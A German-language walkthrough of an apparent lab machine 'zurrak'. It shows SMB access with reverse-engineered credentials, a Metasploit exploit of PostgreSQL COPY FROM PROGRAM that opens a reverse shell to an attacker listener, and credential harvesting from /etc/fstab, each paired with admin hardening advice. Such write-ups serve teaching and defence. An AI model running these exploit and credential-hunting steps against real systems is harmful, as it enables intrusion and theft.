+            <p class="analysis"><strong>Analyse:</strong> Dieser Abschnitt zeigt Assembly-Code-Schnipsel (wahrscheinlich aus der Analyse der `asli.exe`-Datei mit einem Disassembler wie Ghidra oder IDA Pro). Die `mov`-Instruktionen laden einzelne Bytes (Zeichen) in Speicherbereiche oder Register. Die Hex-Werte `69h, 6Ch, 6Fh, 76h, 65h, 63h, 61h, 74h, 73h` entsprechen den ASCII-Codes für die Buchstaben `i, l, o, v, e, c, a, t, s`. Die Schlussfolgerung "converted: ilovecats" zeigt, dass durch die Analyse dieser Assembly-Instruktionen das Steganographie-Passwort `ilovecats` rekonstruiert wurde.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies erklärt, wie das Passwort `ilovecats` (das zuvor bei `steghide` verwendet wurde) gefunden wurde: durch Reverse Engineering der extrahierten `asli.exe`-Datei. Dies zeigt einen alternativen Weg zum Knacken mit `stegseek` oder falls das Passwort nicht in der Wortliste gewesen wäre.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Reverse Engineering kann ein mächtiges Werkzeug sein, um an Informationen wie Passwörter oder Algorithmen zu gelangen, die in ausführbaren Dateien versteckt sind. Tools wie Ghidra, IDA Pro, radare2 sind hierfür nützlich.
+<br><strong>Empfehlung (Admin):</strong> Vermeiden Sie es, Passwörter oder sensible Logik in kompilierten Dateien zu "verstecken". Erfahrene Angreifer können diese oft durch Reverse Engineering extrahieren.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">smbclient \\\\192.168.2.106\\share -U asli%ilovecats</span></div>
+                    <pre>
+Try "help" to get a list of possible commands.
+smb: \>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich versuche nun, auf den im Admin-Panel erwähnten SMB-Share namens "share" zuzugreifen. Ich verwende `smbclient` mit:
+*   `\\\\192.168.2.106\\share`: Der UNC-Pfad zum Share. Die doppelten Backslashes sind für die Shell-Interpretation notwendig.
+*   `-U asli%ilovecats`: Ich gebe den Benutzernamen `asli` (aus dem Dateinamen `asli.exe`) und das durch Steganographie/Reverse Engineering gefundene Passwort `ilovecats` an. Das `%`-Zeichen trennt Benutzername und Passwort in dieser Syntax.
+Der Befehl ist erfolgreich, und ich erhalte einen `smb: \>` Prompt, was bedeutet, dass ich mit dem Share verbunden bin.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolg! Die Kombination aus dem Benutzernamen `asli` (aus dem extrahierten Dateinamen) und dem Passwort `ilovecats` (aus der Steganographie/Analyse) gewährt Zugriff auf den SMB-Share "share". Dies ist ein wichtiger Schritt, da dieser Share wahrscheinlich der Ort ist, an den `emergency.sh` hochgeladen werden muss.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Erkunde den Inhalt des Shares mit SMB-Befehlen wie `ls`, `dir`, `get`, `put`. Suche nach interessanten Dateien oder Hinweisen zum `emergency.sh`-Mechanismus. Bereite die `emergency.sh`-Datei mit einem Reverse-Shell-Payload vor.
+<br><strong>Empfehlung (Admin):</strong> Verwenden Sie starke, einzigartige Passwörter für SMB-Benutzer. Vermeiden Sie es, Benutzernamen oder Hinweise auf Passwörter in Dateinamen oder anderen Metadaten zu hinterlassen. Überprüfen Sie regelmäßig die Berechtigungen und Inhalte von SMB-Shares.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">smb: \operations\New folder\deploy\3\latest\approved\> <span class="command">ls</span></div>
+                    <pre>
+  .                                   D        0  Tue Oct 24 22:21:21 2023
+  ..                                  D        0  Tue Dec 18 07:30:09 2001
+  <span class="command">zurrak.old.vmdk</span>                     N 713883648  Tue Dec 18 07:30:09 2001
+
+		9232860 blocks of size 1024. 3228584 blocks available
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Innerhalb der SMB-Verbindung navigiere ich durch eine tiefe Verzeichnisstruktur (`operations\New folder\deploy\3\latest\approved\`) und führe den Befehl `ls` aus, um den Inhalt aufzulisten. Ich finde eine große Datei namens `zurrak.old.vmdk` (ca. 713 MB).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Eine `.vmdk`-Datei ist eine virtuelle Festplattendatei von VMware (wird aber auch von VirtualBox unterstützt). Dies ist ein extrem ungewöhnlicher und potenziell sehr wertvoller Fund auf einem SMB-Share. Diese Datei könnte ein altes Backup der gesamten virtuellen Maschine oder einer wichtigen Datenpartition enthalten.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Lade die `zurrak.old.vmdk`-Datei herunter (`get zurrak.old.vmdk`). Versuche, sie mit Tools wie `qemu-img`, `guestmount` oder direkt in einer Virtualisierungssoftware (VMware/VirtualBox) zu mounten und zu untersuchen. Sie könnte Konfigurationsdateien, Benutzerdaten, Passwörter oder sogar private Schlüssel enthalten. Überprüfe auch das Root-Verzeichnis des Shares (`cd /`, `ls`), da `emergency.sh` wahrscheinlich dorthin hochgeladen werden muss.
+<br><strong>Empfehlung (Admin):</strong> Speichern Sie niemals vollständige VM-Backups oder sensible Systemabbilder auf leicht zugänglichen SMB-Shares. Solche Daten sollten sicher und verschlüsselt an einem dedizierten Backup-Ort gespeichert werden. Bereinigen Sie Shares regelmäßig von alten oder unnötigen Daten.</p>
+            <!-- Initial Access Inhalt endet hier -->
+        </section>
+
+        <section id="poc">
+            <h2>Proof of Concept: PostgreSQL Command Execution (CVE-2019-9193)</h2>
+            <p class="analysis"><strong>Beschreibung:</strong> Diese Sektion demonstriert, wie eine Schwachstelle im PostgreSQL-Dienst (CVE-2019-9193) ausgenutzt werden kann, um Befehle auf dem Zielsystem als der Benutzer auszuführen, unter dem der PostgreSQL-Dienst läuft (typischerweise `postgres`). Die Schwachstelle erlaubt es authentifizierten Benutzern mit der Berechtigung, `COPY TO/FROM PROGRAM` auszuführen, beliebige Betriebssystembefehle über eine speziell präparierte `COPY`-Anweisung auszuführen.</p>
+            <p class="evaluation"><strong>Voraussetzungen:</strong>
+                <ul>
+                    <li>Netzwerkzugriff auf den PostgreSQL-Port (Standard 5432).</li>
+                    <li>Gültige PostgreSQL-Zugangsdaten (Benutzername/Passwort) mit ausreichenden Rechten (spezifisch die Fähigkeit, `COPY ... PROGRAM` auszuführen, was oft Superuser oder Mitglieder der `pg_execute_server_program`-Gruppe haben). Hier verwenden wir `postgres:baller15`.</li>
+                    <li>Ein Exploit-Tool wie Metasploit mit dem Modul `exploit/multi/postgres/postgres_copy_from_program_cmd_exec`.</li>
+                    <li>Ein Listener auf dem Angreifersystem, um die Reverse Shell zu empfangen.</li>
+                </ul>
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt metasploit-prompt">msf6 > <span class="command">search postgres_copy</span></div>
+                    <pre>
+
+Matching Modules
+================
+
+   #  Name                                                        Disclosure Date  Rank       Check  Description
+   -  ----                                                        ---------------  ----       -----  -----------
+   <span class="command">0  exploit/multi/postgres/postgres_copy_from_program_cmd_exec</span>  2019-03-20       excellent  Yes    PostgreSQL COPY FROM PROGRAM Command Execution
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/postgres/postgres_copy_from_program_cmd_exec
+
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Schritt 1: Exploit-Modul finden:</strong> Ich suche in Metasploit nach Modulen, die sich auf `postgres` und `copy` beziehen. Das Modul `exploit/multi/postgres/postgres_copy_from_program_cmd_exec` wird gefunden, das genau die bekannte Schwachstelle CVE-2019-9193 ausnutzt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Suche bestätigt, dass Metasploit ein geeignetes Modul für den Angriff auf die identifizierte PostgreSQL-Version (unter Annahme der Rechte) bereithält.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt metasploit-prompt">msf6 > <span class="command">use 0</span></div>
+                     <pre>[*] Using configured payload cmd/unix/reverse_perl</pre>
+                   <div class="prompt metasploit-prompt">msf6 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > <span class="command">options</span></div>
+                    <pre>
+
+Module options (exploit/multi/postgres/postgres_copy_from_program_cmd_exec):
+
+   Name               Current Setting  Required  Description
+   ----               ---------------  --------  -----------
+   DATABASE           template1        yes       The database to authenticate against
+   DUMP_TABLE_OUTPUT  false            no        select payload command output from table (F
+                                                 or Debugging)
+   PASSWORD           postgres         no        The password for the specified username. Le
+                                                 ave blank for a random password.
+   RHOSTS                              yes       The target host(s), see https://docs.metasp
+                                                 loit.com/docs/using-metasploit/basics/using
+                                                 -metasploit.html
+   RPORT              5432             yes       The target port (TCP)
+   TABLENAME          rzHBRvxxcf       yes       A table name that does not exist (To avoid
+                                                 deletion)
+   USERNAME           postgres         yes       The username to authenticate as
+
+
+Payload options (cmd/unix/reverse_perl):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Schritt 2: Modul laden und Optionen prüfen:</strong> Ich lade das gefundene Modul mit `use 0`. Metasploit wählt standardmäßig einen Payload (`cmd/unix/reverse_perl`). Mit `options` lasse ich mir die notwendigen Einstellungen anzeigen. Wir müssen `RHOSTS` (Ziel-IP), `USERNAME`, `PASSWORD`, `LHOST` (Listener-IP) und `LPORT` (Listener-Port) setzen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Optionen zeigen klar, welche Informationen benötigt werden. Der Standard-Payload `reverse_perl` ist eine gute Wahl für Unix-Ziele.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt metasploit-prompt">msf6 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > <span class="command">set rhosts 192.168.2.106</span></div>
+                    <pre>rhosts => 192.168.2.106</pre>
+                    <div class="prompt metasploit-prompt">msf6 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > <span class="command">set password baller15</span></div>
+                    <pre>password => baller15</pre>
+                    <div class="prompt metasploit-prompt">msf6 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > <span class="command">set rport 5432</span></div>
+                    <pre>rport => 5432</pre>
+                   <div class="prompt metasploit-prompt">msf6 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > <span class="command">set lhost eth0</span></div>
+                    <pre>lhost => 192.168.2.199</pre>
+                    <div class="prompt metasploit-prompt">msf6 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > <span class="command">run</span></div>
+                    <pre>
+[*] <span class="password">Started reverse TCP handler on 192.168.2.199:4444</span>
+[*] 192.168.2.106:5432 - 192.168.2.106:5432 - PostgreSQL 15.3 (Debian 15.3-0+deb12u1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 12.2.0-14) 12.2.0, 64-bit
+[*] 192.168.2.106:5432 - Exploiting...
+[+] 192.168.2.106:5432 - 192.168.2.106:5432 - rzHBRvxxcf dropped successfully
+[+] 192.168.2.106:5432 - 192.168.2.106:5432 - rzHBRvxxcf created successfully
+[+] 192.168.2.106:5432 - 192.168.2.106:5432 - rzHBRvxxcf copied successfully(valid syntax/command)
+[+] 192.168.2.106:5432 - 192.168.2.106:5432 - rzHBRvxxcf dropped successfully(Cleaned)
+[*] <span class="password">192.168.2.106:5432 - Exploit Succeeded</span>
+[*] <span class="password">Command shell session 1 opened (192.168.2.199:4444 -> 192.168.2.106:50434) at 2023-11-23 22:28:51 +0100</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Schritt 3: Optionen setzen und Exploit ausführen:</strong> Ich setze die Ziel-IP (`rhosts`), das gefundene PostgreSQL-Passwort (`password baller15` - Benutzername ist standardmäßig `postgres`), den Port (`rport`), und meine lokale IP (`lhost eth0`, was Metasploit zu `192.168.2.199` auflöst). Dann starte ich den Exploit mit `run`. Metasploit startet den Listener, verbindet sich zur Datenbank, führt den Exploit aus (erstellt und löscht eine temporäre Tabelle) und meldet Erfolg.</p>
+            <p class="evaluation"><strong>Erwartetes & Tatsächliches Ergebnis / Beweismittel:</strong> Der Exploit war erfolgreich. Wie erwartet, öffnet sich eine Command Shell Session (`session 1 opened`). Die Verbindung läuft von meinem Listener auf `192.168.2.199:4444` zum Ziel auf einem zufälligen hohen Port.</p>
+            <p class="recommendation"><strong>Risikobewertung:</strong> Die erfolgreiche Ausnutzung dieser Schwachstelle bedeutet, dass ein Angreifer mit gültigen PostgreSQL-Zugangsdaten (die hier durch Brute-Force erlangt wurden) beliebigen Code als der PostgreSQL-Dienstbenutzer ausführen kann. Dies ermöglicht dem Angreifer, im System Fuß zu fassen, weitere Informationen zu sammeln und nach Wegen zur Rechteausweitung zu suchen. Das Risiko ist als Hoch einzustufen.</p>
+            <p class="recommendation"><strong>Empfehlungen (Admin):</strong>
+                <ul>
+                    <li>Patchen Sie die PostgreSQL-Instanz auf eine Version, die nicht für CVE-2019-9193 anfällig ist.</li>
+                    <li>Entziehen Sie Benutzern, die sie nicht unbedingt benötigen, die Berechtigung `COPY ... PROGRAM` (oder die Mitgliedschaft in `pg_execute_server_program`).</li>
+                    <li>Verwenden Sie starke, einzigartige Passwörter für Datenbankbenutzer.</li>
+                    <li>Beschränken Sie den Netzwerkzugriff auf die Datenbank nur auf die Systeme, die ihn benötigen.</li>
+                    <li>Überwachen Sie Datenbanklogs auf verdächtige Aktivitäten wie das Erstellen/Löschen von Tabellen oder ungewöhnliche `COPY`-Befehle.</li>
+                </ul>
+            </p>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+            <!-- Privilege Escalation Inhalt beginnt hier -->
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+shell
+[*] Trying to find binary 'python' on the target machine
+[-] python not found
+[*] Trying to find binary 'python3' on the target machine
+[*] Found python3 at /usr/bin/python3
+[*] Using `python` to pop up an interactive shell
+[*] Trying to find binary 'bash' on the target machine
+[*] Found bash at /usr/bin/bash
+<span class="command">id</span>
+<span class="command">uid=101(postgres) gid=110(postgres) groups=110(postgres),109(ssl-cert)</span>
+                    </pre>
+                     <div class="prompt">postgres@zurrak:/var/lib/postgresql/15/main$ <span class="command">bash</span></div>
+                     <pre>bash</pre>
+                     <div class="prompt">postgres@zurrak:/var/lib/postgresql/15/main$ <span class="command">whoami</span></div>
+                     <pre>whoami
+<span class="command">postgres</span></pre>
+                     <div class="prompt">postgres@zurrak:/var/lib/postgresql/15/main$ </div>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Nach dem Öffnen der Metasploit-Session (`shell`) wird versucht, eine interaktivere Shell zu starten. Metasploit findet `python3` und `bash` und startet eine Bash-Shell. Die Befehle `id` und `whoami` bestätigen, dass wir als Benutzer `postgres` (UID 101) agieren.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Wir haben nun eine stabile Shell als Benutzer `postgres` auf dem Zielsystem. Dies ist unser Ausgangspunkt für die Suche nach Möglichkeiten zur Rechteausweitung (Privilege Escalation) zum Benutzer `root`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beginne mit der Enumeration des Systems aus der Sicht des `postgres`-Benutzers: Suche nach SUID/GUID-Dateien, überprüfe `sudo -l`, suche nach Konfigurationsdateien mit Passwörtern, prüfe Cronjobs, Kernel-Version etc.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">postgres@zurrak:/var/lib/postgresql/15/main$ <span class="command">python3 -c "import pty;pty.spawn('/bin/bash')"</span></div>
+                    </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Ich verbessere die Shell-Interaktivität weiter, indem ich eine vollwertige PTY (Pseudo-Terminal) mit Python starte. Dies ermöglicht Funktionen wie Befehlshistorie, Tab-Vervollständigung und die korrekte Funktion von Programmen wie `su` oder `sudo`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ein Standardverfahren nach Erhalt einer einfachen Reverse Shell, um die Benutzerfreundlichkeit und Funktionalität zu erhöhen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Immer versuchen, die Shell zu einer PTY aufzuwerten, wenn Python oder andere geeignete Tools auf dem Zielsystem verfügbar sind.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">postgres@zurrak:/var/lib/postgresql/15/main$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div>
+                     <pre>
+&lt;15/main$ find / -type f -perm -4000 -ls 2&gt;/dev/null
+   <span class="command">390273     64 -rwsr-xr-x   1 root     root        62672 Mar 23  2023 /usr/bin/chfn</span>
+   <span class="command">393891     36 -rwsr-xr-x   1 root     root        35128 Mar 23  2023 /usr/bin/umount</span>
+   <span class="command">390277     68 -rwsr-xr-x   1 root     root        68248 Mar 23  2023 /usr/bin/passwd</span>
+   <span class="command">393889     60 -rwsr-xr-x   1 root     root        59704 Mar 23  2023 /usr/bin/mount</span>
+   <span class="command">418988     36 -rwsr-xr-x   1 root     root        35128 Apr 18  2023 /usr/bin/fusermount3</span>
+   <span class="command">394486     72 -rwsr-xr-x   1 root     root        72000 Mar 23  2023 /usr/bin/su</span>
+   <span class="command">390274     52 -rwsr-xr-x   1 root     root        52880 Mar 23  2023 /usr/bin/chsh</span>
+   <span class="command">393735     48 -rwsr-xr-x   1 root     root        48896 Mar 23  2023 /usr/bin/newgrp</span>
+   <span class="command">390276     88 -rwsr-xr-x   1 root     root        88496 Mar 23  2023 /usr/bin/gpasswd</span>
+   <span class="command">414876    640 -rwsr-xr-x   1 root     root       653888 Sep 23 18:11 /usr/lib/openssh/ssh-keysign</span>
+   <span class="command">398889     52 -rwsr-xr--   1 root     messagebus    51272 Sep 16 06:03 /usr/lib/dbus-1.0/dbus-daemon-launch-helper</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich suche nach Dateien mit dem SUID-Bit (`-perm -4000`). Solche Dateien werden mit den Rechten des Dateibesitzers (hier meist `root`) ausgeführt, unabhängig davon, wer sie startet. `-type f` beschränkt die Suche auf Dateien, `-ls` zeigt Details an, und `2>/dev/null` unterdrückt Fehlermeldungen (z.B. bei Zugriff verweigert).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Liste zeigt die üblichen Verdächtigen (`chfn`, `umount`, `passwd`, `mount`, `su`, etc.). Keine ungewöhnlichen oder sofort ausnutzbar erscheinenden SUID-Binaries sind auf den ersten Blick zu sehen. Es lohnt sich jedoch immer, diese Standard-Binaries auf bekannte Exploits für die spezifische Betriebssystemversion zu prüfen (GTFOBins ist hier eine gute Ressource).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfe die gefundenen SUID-Binaries auf GTFOBins auf mögliche Privesc-Vektoren. Fahre mit anderen Enumerationstechniken fort.
+<br><strong>Empfehlung (Admin):</strong> Reduzieren Sie die Anzahl der SUID-Binaries auf das absolute Minimum. Entfernen Sie das SUID-Bit von Programmen, bei denen es nicht zwingend erforderlich ist. Halten Sie das System aktuell, um bekannte SUID-Exploits zu vermeiden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">postgres@zurrak:/var/lib/postgresql/15/main$ <span class="command">cat /etc/fstab</span></div>
+                     <pre>
+cat /etc/fstab
+# /etc/fstab: static file system information.
+#
+# Use 'blkid' to print the universally unique identifier for a
+# device; this may be used with UUID= as a more robust way to name devices
+# that works even if disks are added and removed. See fstab(5).
+#
+# systemd generates mount units based on this file, see systemd.mount(5).
+# Please run 'systemctl daemon-reload' after making changes here.
+#
+# &lt;file system&gt; &lt;mount point&gt;   &lt;type&gt;  &lt;options&gt;       &lt;dump&gt;  &lt;pass&gt;
+# / was on /dev/sda1 during installation
+UUID=86e74abe-2367-4664-8041-b897fb803a6d /               ext4    errors=remount-ro 0       1
+# swap was on /dev/sda5 during installation
+UUID=68b2a8a8-27f9-4255-9e14-180abd1261c4 none            swap    sw              0       0
+/dev/sr0        /media/cdrom0   udf,iso9660 user,noauto     0       0
+
+#
+<span class="password">//127.0.0.1/internal	uid=emre, pw=daily666</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich lasse mir den Inhalt der Datei `/etc/fstab` anzeigen. Diese Datei definiert, welche Dateisysteme beim Systemstart oder manuell gemountet werden sollen. Neben den Standardeinträgen für das Root-Dateisystem (`/`), Swap und CD-ROM finde ich eine auskommentierte Zeile (`#`), die jedoch sehr interessante Informationen enthält: `//127.0.0.1/internal uid=emre, pw=daily666`. Dies scheint ein Versuch zu sein, einen lokalen SMB-Share (oder einen Share auf dem Loopback-Interface) namens `internal` mit den Zugangsdaten `emre:daily666` zu mounten.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Kritischer Fund! Auch wenn die Zeile auskommentiert ist, verrät sie uns ein weiteres Paar Zugangsdaten: `emre` mit dem Passwort `daily666`. Diese könnten für den Benutzer `emre` systemweit oder für den Zugriff auf den erwähnten SMB-Share `internal` gültig sein.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuche, dich als Benutzer `emre` mit dem Passwort `daily666` anzumelden (`su emre` oder über SSH, falls verfügbar). Versuche, auf einen SMB-Share namens `internal` zuzugreifen, sowohl auf dem Zielsystem (`smbclient //127.0.0.1/internal -U emre%daily666`) als auch von außen (`smbclient //192.168.2.106/internal -U emre%daily666`).
+<br><strong>Empfehlung (Admin):</strong> Speichern Sie niemals Passwörter im Klartext in Konfigurationsdateien wie `/etc/fstab`, auch nicht auskommentiert! Verwenden Sie sicherere Methoden zur Authentifizierung bei Mounts (z.B. Kerberos, Credential-Dateien mit eingeschränkten Rechten).</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">postgres@zurrak:/var/lib/postgresql/15/main$ <span class="command">grep pw -iR /etc 2>/dev/null</span></div>
+                    <pre>
+/etc/mime.types:application/vnd.3M.Post-it-Notes		pwn
+/etc/mime.types:application/vnd.exstream-empower+zip		mpw
+/etc/mime.types:application/vnd.intercon.formnet		xpw xpx
+/etc/mime.types:application/vnd.pwg-multiplexed
+/etc/mime.types:application/vnd.pwg-xhtml-print+xml
+/etc/mime.types:image/pwg-raster
+/etc/services:groupwise	1677/tcp
+---------------------------------------------------------------------------
+<span class="command">/etc/fstab://127.0.0.1/internal	uid=emre, pw=daily666</span>
+---------------------------------------------------------------------------
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich durchsuche rekursiv (`-R`) das gesamte `/etc`-Verzeichnis nach Dateien, die die Zeichenkette "pw" (Groß-/Kleinschreibung ignorieren: `-i`) enthalten. Fehlermeldungen werden unterdrückt (`2>/dev/null`). Neben vielen irrelevanten Treffern in `mime.types` und `services` wird der bereits bekannte Eintrag aus `/etc/fstab` erneut gefunden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Diese Suche bestätigt den Fund aus `/etc/fstab`, liefert aber keine neuen Hinweise auf Passwörter. Das Vorgehen ist jedoch eine gängige Methode, um nach potenziell vergessenen oder falsch abgelegten Zugangsdaten in Konfigurationsdateien zu suchen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwende `grep` mit verschiedenen Schlüsselwörtern (`password`, `secret`, `key`, `token`, `pass`, `cred`, etc.) in sensiblen Verzeichnissen wie `/etc`, `/var/www`, `/opt`, Home-Verzeichnissen, um nach Zugangsdaten zu suchen.
+<br><strong>Empfehlung (Admin):</strong> Vermeiden Sie das Speichern von Klartext-Passwörtern in Dateien. Verwenden Sie Konfigurationsmanagement-Tools und Secrets-Management-Lösungen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">postgres@zurrak:/var/lib/postgresql/15/main$ <span class="command">cat /etc/passwd</span></div>
+                     <pre>
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
+systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
+messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
+<span class="command">postgres:x:101:110:PostgreSQL administrator,,,:/home/postgres:/bin/bash</span>
+<span class="command">shareuser:x:102:65534::/nonexistent:/usr/sbin/nologin</span>
+vnstat:x:103:112:vnstat daemon,,,:/var/lib/vnstat:/usr/sbin/nologin
+<span class="command">emre:x:1000:1000:,,,:/home/postgres:exit</span>
+<span class="command">asli:x:1001:1001:,,,:/home/postgres:exit</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich lasse mir die `/etc/passwd`-Datei anzeigen, um eine Liste der lokalen Benutzerkonten zu erhalten. Interessant sind hier vor allem die Benutzer mit UIDs >= 1000 (normale Benutzer) und solche mit einer Login-Shell (z.B. `/bin/bash`).
+Wir sehen:
+*   `root` (UID 0) mit `/bin/bash`.
+*   `postgres` (UID 101) mit `/bin/bash`.
+*   `emre` (UID 1000) mit `/home/postgres` als Home-Verzeichnis und `exit` als Shell.
+*   `asli` (UID 1001) mit `/home/postgres` als Home-Verzeichnis und `exit` als Shell.
+*   `shareuser` (UID 102) ohne Login-Shell.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Benutzer `emre` und `asli` existieren tatsächlich, wie durch die Funde (`pw=daily666` für `emre`, `asli.exe` für `asli`) vermutet. Die Konfiguration ihrer Shell auf `exit` ist sehr ungewöhnlich und wahrscheinlich eine (fehlerhafte) Sicherheitsmaßnahme, um einen direkten Login zu verhindern. Das Home-Verzeichnis `/home/postgres` für beide ist ebenfalls merkwürdig. Der `shareuser` könnte mit dem SMB-Share zusammenhängen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuche, dich mit `su emre` und dem Passwort `daily666` anzumelden, um zu sehen, was die `exit`-Shell bewirkt. Untersuche das Verzeichnis `/home/postgres` auf Dateien, die `emre` oder `asli` gehören.
+<br><strong>Empfehlung (Admin):</strong> Weisen Sie Benutzern korrekte Home-Verzeichnisse zu. Wenn ein Benutzer keine interaktive Shell haben soll, verwenden Sie `/usr/sbin/nologin` oder `/bin/false` als Shell, nicht `exit`. Überprüfen Sie den Zweck der Benutzer `emre` und `asli`.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">postgres@zurrak:/var/lib/postgresql/15/main$ <span class="command">su emre</span></div>
+                     <pre>
+su emre
+Password: <span class="password">daily666</span>
+
+<span class="password">su: failed to execute exit: Permission denied</span>
+                    </pre>
+                     <div class="prompt">postgres@zurrak:/var/lib/postgresql/15/main$ </div>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich versuche, mit `su emre` zum Benutzer `emre` zu wechseln und gebe das gefundene Passwort `daily666` ein. Der `su`-Befehl schlägt fehl mit der Meldung `failed to execute exit: Permission denied`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies bestätigt, dass die in `/etc/passwd` eingetragene Shell (`exit`) keine gültige Login-Shell ist und der Wechsel zum Benutzer `emre` über `su` somit scheitert. Das Passwort `daily666` scheint jedoch korrekt zu sein, da keine Passwort-Fehlermeldung erscheint. Der Benutzer `emre` kann also wahrscheinlich für andere Dienste (wie SMB) verwendet werden, aber nicht für einen direkten Shell-Login.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwende die Credentials `emre:daily666` für den SMB-Zugriff auf den Share `internal`, wie in `/etc/fstab` angedeutet.
+<br><strong>Empfehlung (Admin):</strong> Korrigieren Sie die Shell-Einträge für `emre` und `asli` in `/etc/passwd` auf `/usr/sbin/nologin`, wenn kein Shell-Zugriff erwünscht ist.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">postgres@zurrak:/dev/shm$ <span class="command">grep bash /etc/passwd</span></div>
+                    <pre>
+
+<span class="command">root:x:0:0:root:/root:/bin/bash</span>
+<span class="command">postgres:x:101:110:PostgreSQL administrator,,,:/home/postgres:/bin/bash</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich filtere die `/etc/passwd`-Datei erneut, diesmal spezifisch nach Zeilen, die `/bin/bash` enthalten, um schnell die Benutzer mit einer Standard-Bash-Shell zu identifizieren.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt, dass nur `root` und `postgres` eine Bash-Shell konfiguriert haben. Dies unterstreicht, dass der Weg über `emre` oder `asli` wahrscheinlich nicht zu einer direkten Shell-Eskalation führt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester & Admin):</strong> Keine neuen Empfehlungen basierend auf dieser gefilterten Ansicht.</p>
+
